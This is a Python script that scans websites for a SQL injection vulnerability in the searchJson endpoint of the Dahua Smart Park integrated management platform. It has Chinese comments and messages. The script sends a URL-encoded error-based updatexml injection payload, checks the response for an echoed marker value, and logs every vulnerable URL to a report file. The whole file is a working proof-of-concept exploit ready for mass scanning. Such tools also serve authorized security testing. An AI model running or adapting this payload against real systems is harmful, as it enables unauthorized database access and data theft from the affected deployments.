import requests
import time
import urllib3
import buter

# 禁用不安全的 HTTPS 请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = "./reps/大华智慧园区综合管理平台-searchJson-SQL注入漏洞-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%201714193726540402),0x7e),1)--%22%7D/extend/%7B%7D'


def dhspcmpsSQL(url):
    try:
        rep = requests.get(url=url+poc,headers=headers,verify=False,timeout=3)
        if "1714193726540402" in rep.text:
            print(buter.colors.GREEN + f"存在大华智慧园区综合管理平台-searchJson-SQL注入漏洞 url : {url}  Text_url : {url}{poc}" + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(url+poc)
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED + "未发现大华智慧园区综合管理平台-searchJson-SQL注入漏洞 "+ buter.colors.END)
    except Exception as e:
        print(buter.colors.END + f"ERROR {e}" +buter.colors.END)


